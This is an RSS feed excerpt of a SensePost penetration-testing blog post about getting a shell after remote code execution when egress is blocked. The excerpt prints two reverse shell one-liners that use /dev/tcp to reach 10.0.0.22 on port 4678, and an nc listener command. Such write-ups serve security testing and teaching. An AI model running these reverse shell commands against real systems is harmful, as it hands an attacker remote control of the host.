---
source: rss/sensepost
title: No Egress, No Shell, No Problem
url: https://sensepost.com/blog/2025/no-egress-no-shell-no-problem/
date: 2025-06-26
item_id: https://sensepost.com/blog/2025/no-egress-no-shell-no-problem/
category: techniques
tags: [Rce]
---

**Source:** SensePost
**Link:** https://sensepost.com/blog/2025/no-egress-no-shell-no-problem/

Context, context, context; Alright, imagine this &#8211;  you&#8217;re on an engagement, find a few vulnerabilities, run a few exploits and next thing you know you have Remote Code Execution (RCE).  
 Now, like muscle memory, your next instinct would be to get a shell. Running the following is fairly simple: 
  sh -i &gt;&amp; /dev/tcp/10.0.0.22/4678 0&gt;&amp;1  
 Then listen in and&#8230; 
  nc -lvnp 4678
...  
 Huh? Sorry, I mean run this, and&#8230; 
  0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.22/4678; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  
 &#8230;and&#8230;
